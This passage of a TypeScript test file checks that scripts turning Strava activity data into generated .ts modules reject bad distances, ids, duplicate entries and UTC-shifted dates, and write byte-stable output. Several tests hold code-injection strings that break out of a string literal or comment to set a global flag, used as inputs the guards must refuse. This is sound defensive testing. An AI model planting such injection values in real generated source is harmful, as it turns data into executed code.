     * `{valueOf: () => 5}` became 5, and `"17908.4"` became a CONVERTED 17908.4 — the last of
     * which is a stored `f(source)` inside a function whose docblock forbids exactly that.
     *
     * NONE OF IT IS VISIBLE DOWNSTREAM, which is why it needs a case here rather than a
     * reviewer. A race scaffolded from `distance: true` ships `metres: 1` — positive, finite,
     * and accepted by every assertion `tests/data-contract.test.ts` makes.
     *
     * THE NEGATIVE CASE IS SEPARATE ON PURPOSE: deleting the `metres < 0` half of the guard
     * leaves every other assertion in this file green, and `raceKm` sums metres, so a negative
     * one shortens the race rather than failing it.
     */
    it("refuses a distance that is not a number, rather than coercing one out of it", () => {
        const activity = (distance: unknown) =>
            [{id: 12058884605, start_date: "2024-08-04T00:11:00Z", elapsed_time: 60, distance}];
        for (const distance of [null, undefined, "", [], false, true, "0x10", "17908.4", {valueOf: () => 5}, NaN, Infinity, -1]) {
            expect(() => recordingsFrom(activity(distance)),
                `${JSON.stringify(distance) ?? String(distance)} was accepted as a distance`)
                .toThrow(/is not a length in metres/);
        }
        // And the shape the API actually sends is untouched, including a legitimate zero.
        expect(recordingsFrom(activity(17908.4))[0].metres).toBe(17908.4);
        expect(recordingsFrom(activity(0))[0].metres, "a zero-metre activity is odd but not malformed").toBe(0);
    });

    /**
     * THE ID SEAM ITSELF, ASKED DIRECTLY, BECAUSE THE CASES ABOVE CANNOT SEE IT ALONE.
     *
     * `main` reads an activity's id TWICE — once into a `recordings` row, once into the JSDoc
     * evidence line — and the two reads live in two functions. A guard on only the first would
     * still close the JSDoc case above, because the object literal `main` builds evaluates
     * `recordings:` before `titles:` and the row guard would throw first — an ACCIDENT OF
     * PROPERTY ORDER, not a defence. Reordering those two properties would take that case green
     * over a live breakout.
     *
     * So the guard is asserted on its own, and on BOTH callers. MEASURED: reverting `titlesFrom`
     * to `String(a.id)` leaves every other assertion in this repository green and reddens only
     * the last line here.
     */
    it("validates an activity id once, for both the places it reaches generated source", () => {
        expect(activityId({id: 12058884605}), "a real id is a decimal string, never a number")
            .toBe("12058884605");
        expect(activityId({id: "12058884605"})).toBe("12058884605");
        for (const hostile of [
            '1", metres: (globalThis.P = 1, 5), z: "',
            "1*/ globalThis.P = 1; /*",
            "], EVIL, [",
            "",
            "12058884605 ",
            "1e3",
            "-1",
        ]) {
            expect(() => activityId({id: hostile}), `${JSON.stringify(hostile)} was accepted as an id`)
                .toThrow(/not a decimal Strava id/);
            expect(() => recordingsFrom([{id: hostile, elapsed_time: 60, distance: 1000}]),
                "the recordings seam let it through").toThrow(/not a decimal Strava id/);
            expect(() => titlesFrom([{id: hostile, name: "Morning Ride"}]),
                "the JSDoc evidence seam let it through").toThrow(/not a decimal Strava id/);
        }
    });

    /**
     * THE SAME ACTIVITY TWICE IS A DOUBLED RACE. It emitted two identical `recordings` rows and
     * exited 0; `raceKm` sums the metres, so the bib then claimed twice the distance and twice
     * the recorded time, in the flattering direction. Nothing downstream sees it either —
     * `tests/data-contract.test.ts` refuses one activity shared by two RACES, and this is one
     * race holding it twice.
     */
    it("refuses the same activity id twice rather than doubling the race", () => {
        expect(() => distinctIds(["1", "2", "1"])).toThrow(/given more than once/);
        expect(() => distinctIds(["1", "1", "1"])).toThrow(/DOUBLE the race's distance/);
        expect(distinctIds(["1", "2"]), "two different parts are the ordinary split race")
            .toEqual(["1", "2"]);
        expect(distinctIds([])).toEqual([]);
    });

    /**
     * THE CALENDAR DAY IS THE RIDER'S, AND SINGAPORE IS UTC+8.
     *
     * This was a line inside `main` with a comment asserting it was right, reachable by nothing:
     * changing it to read `start_date` — the UTC instant — was green across the whole suite. A
     * 06:00 SGT start is 22:00 the PREVIOUS day in UTC, so a New Year's Day race would scaffold
     * as 31 December: not merely the wrong day but the wrong YEAR, and `eventsInYear` would drop
     * it off the goal card, the countdown and the required rate.
     *
     * THE FIXTURE IS SGT-SHAPED ON PURPOSE. An hour-apart pair passes under both spellings; the
     * two fields here fall on different days AND different years, which is the only shape that
     * tells them apart. The `Z` on `start_date_local` is Strava's own lie — the instant is
     * already shifted — so the day is taken off the front of the string rather than parsed.
     */
    it("reads the day off the rider's own clock, not off UTC", () => {
        const newYear = {id: 7, start_date: "2026-12-31T22:00:00Z", start_date_local: "2027-01-01T06:00:00Z"};
        expect(calendarDate(newYear)).toBe("2027-01-01");
        expect(newYear.start_date.slice(0, 10),
            "the fixture must actually discriminate: the two fields have to fall on different days")
            .toBe("2026-12-31");
        expect(() => calendarDate({id: 7, start_date: "2026-12-31T22:00:00Z"}))
            .toThrow(/no readable start_date_local/);
    });
});

describe("the race scaffold's edit-order note", () => {
    const ENTRIES = ["2026-08-02-pesta-sukan-round-island-bike-adventure.ts", "index.ts", "README.md"];

    it("finds the modules already claiming a day", () => {
        expect(modulesOn("2026-08-02", ENTRIES)).toEqual([ENTRIES[0]]);
        expect(modulesOn("2026-08-03", ENTRIES)).toEqual([]);
    });

    /**
     * WHICH ORDER, AND THE TWO ARMS SAY OPPOSITE THINGS. There is no order that is right at
     * both moments: fetching first on an already-listed race counts its distance twice —
     * measured at 66 km/wk against an honest 71 — and adding the module first for a race the
     * site never saw leaves the page short until the next cron. The note has to name the arm,
     * so both are asserted; one message for both cases would be the defect.
     */
    it("names the arm the directory says you are on", () => {
        expect(editOrderNote("2026-08-02", modulesOn("2026-08-02", ENTRIES)))
            .toContain("ADD THE RECORDING FIRST");
        expect(editOrderNote("2026-08-03", modulesOn("2026-08-03", ENTRIES)))
            .toContain("FETCH FIRST");
    });
});

/**
 * THE WEEK FETCHER'S OUTPUT, WHICH IS A SCRIPT'S CONTRACT RATHER THAN A PROPERTY OF THE DATA.
 *
 * The allow-list, the ISO week rule and the cross-check against the year total all live in
 * `tests/training.test.ts`, beside the type they are about. What belongs HERE is what belongs
 * beside the other two Strava scripts: the bytes this one writes, and whether a value the API
 * controls can become code in the file it is written into.
 *
 * THE BYTE-STABILITY HALF IS NOT COSMETIC. `.github/workflows/strava-progress.yml` commits only
 * when the staged index holds something, so unstable output means a commit, a merge and a
 * production deploy every single night, for ever, with nothing red. The sibling script's
 * `nextProgress` has the same contract asserted in `tests/projection.test.ts` under "the bot's
 * write contract"; this is that contract for the other half of the same job.
 */
describe("the week fetcher's output", () => {
    const SESSIONS = [
        {id: "19876422727", sport_type: "Run", start_local: "2026-08-24T18:27:38Z", metres: 6007.3, moving_seconds: 2439, elapsed_seconds: 2971},
        {id: "19871739075", sport_type: "WeightTraining", start_local: "2026-08-24T06:22:00Z", metres: 0, moving_seconds: 3586, elapsed_seconds: 3586},
    ];

    it("writes a module that compiles, imports its own type, and ends in a newline", () => {
        const rendered = renderWeek(SESSIONS);
        expect(rendered).toContain('import type {TrainingWeek} from "../../lib/training"');
        expect(rendered).toContain("satisfies TrainingWeek");
        expect(rendered.endsWith("\n"), "no trailing newline — every diff would show the last line")
            .toBe(true);
        // Four-space indent on the session rows, matching every other generated module here.
        for (const row of rendered.split("\n").filter((line) => line.startsWith(" "))) {
            expect(row, "a session row is not indented four spaces").toMatch(/^ {4}\{/);
        }
    });

    it("orders sessions totally, so a re-fetch cannot reorder a file", () => {
        // START TIME FIRST, THEN THE ID. Two uploads really can share a start second — a
        // duplicated import does it — and without the tiebreak the order would follow whatever
        // order the API paged them in. That is stable on most nights and not all of them, which
        // is the worst kind of unstable: a nightly deploy nobody can reproduce.
        const sameSecond = [
            {...SESSIONS[0], id: "300"}, {...SESSIONS[0], id: "100"}, {...SESSIONS[0], id: "200"},
        ];
        expect(orderSessions(sameSecond).map((s) => s.id)).toEqual(["100", "200", "300"]);
        expect(orderSessions(SESSIONS).map((s) => s.id)).toEqual(["19871739075", "19876422727"]);
        // Ordering is not mutation: the caller's array survives.
        expect(SESSIONS.map((s) => s.id)).toEqual(["19876422727", "19871739075"]);
    });

    it("renders the same bytes for the same sessions, whatever order it is handed them", () => {
        expect(renderWeek(SESSIONS)).toBe(renderWeek([...SESSIONS].reverse()));
    });

    /**
     * REFUSED, NOT ESCAPED — the same rule the race scaffold's payload block states. A value
     * Strava controls that reaches a `.ts` file this repository then imports is code, and
     * `sport_type` is the only string on a session that is not already a fixed shape.
     *
     * THE THROW IS TYPED. A bare `toThrow()` would pass on a `TypeError` from a refactor that
     * never reached the guard, so each case names the field that refused it.
     */
    it("cannot be made to write executable code out of a sport_type", () => {
        const activity = (sport_type: string) => ({
            id: 19876422727, sport_type, start_date_local: "2026-08-24T18:27:38Z",
            distance: 6007.3, moving_time: 2439, elapsed_time: 2971,
        });
        for (const payload of [
            'Run", metres: (globalThis.PWNED = 1, 5), z: "',
            "Run\\", "Run\n", "Run*/ globalThis.PWNED = 1; /*", "",
        ]) {
            expect(() => toSession(activity(payload)),
                `${JSON.stringify(payload)} was accepted as a sport_type`).toThrow(/sport_type/);
        }
    });

    it("asks Strava for one week-year and sweeps exactly what it asked for", () => {
        // The sweep deletes a covered week that came back empty, which is how a deleted Strava
        // activity leaves this repository — and is why the covered set is DERIVED from the same
        // list the window is derived from rather than globbed off the filenames.
        expect(weekKeysOfYear(2026)).toHaveLength(53);
        expect(weekKeysOfYear(2025)).toHaveLength(52);
        expect(weekKeysOfYear(2026).at(0)).toBe("2026-W01");
        expect(weekKeysOfYear(2026).at(-1)).toBe("2026-W53");
        const {after, before} = yearWindow(2026);
        expect(before - after, "a year's window is at least a year wide").toBeGreaterThan(370 * 86400);
        expect(Number.isInteger(after) && Number.isInteger(before), "epochs must be whole seconds")
            .toBe(true);
    });
});
